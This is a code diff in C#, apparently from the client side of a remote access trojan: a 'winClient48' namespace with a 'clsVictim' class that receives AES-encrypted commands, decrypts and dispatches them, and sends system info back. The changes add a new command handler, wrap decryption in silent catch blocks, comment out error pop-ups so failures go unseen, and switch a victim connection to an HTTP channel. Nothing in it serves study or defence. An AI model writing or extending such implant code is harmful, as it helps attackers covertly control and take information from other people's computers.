@@ -378,9 +378,16 @@ namespace winClient48
                             {
                                 if (dsp.Param == 0) //RECEIVED COMMAND
                                 {
-                                    string payload = Encoding.UTF8.GetString(dsp.GetMsg().msg);
-                                    payload = clsCrypto.AESDecrypt(Convert.FromBase64String(payload), v._AES.key, v._AES.iv);
-                                    _Received(v, payload);
+                                    try
+                                    {
+                                        string payload = Encoding.UTF8.GetString(dsp.GetMsg().msg);
+                                        payload = clsCrypto.AESDecrypt(Convert.FromBase64String(payload), v._AES.key, v._AES.iv);
+                                        _Received(v, payload);
+                                    }
+                                    catch
+                                    {
+
+                                    }
                                 }
                                 else if (dsp.Param == 1) //PIGN TIME, LATENCY
                                 {
@@ -544,13 +551,29 @@ namespace winClient48
                                 new Thread(() => SendInfo(victim)).Start();
                             }
                         }
+                        else if (dsp.Command == 2)
+                        {
+                            if (dsp.Param == 0)
+                            {
+                                try
+                                {
+                                    string payload = Encoding.UTF8.GetString(dsp.GetMsg().msg);
+                                    payload = clsCrypto.AESDecrypt(Convert.FromBase64String(payload), victim._AES.key, victim._AES.iv);
+                                    _Received(victim, payload);
+                                }
+                                catch
+                                {
+
+                                }
+                            }
+                        }
                     }
                 }
                 while (recv_len > 0);
             }
             catch (Exception ex)
             {
-                MessageBox.Show(ex.Message);
+                //MessageBox.Show(ex.Message);
                 is_connected = false;
             }
         }
@@ -2820,6 +2843,7 @@ namespace winClient48
                     client.Connect(ip, port);
 
                     clsVictim victim = new clsVictim(client.Client);
+                    victim.m_protocol = clsVictim.enProtocol.HTTP;
 
                     new Thread(() => fnHttpRecv(victim)).Start();
                 }
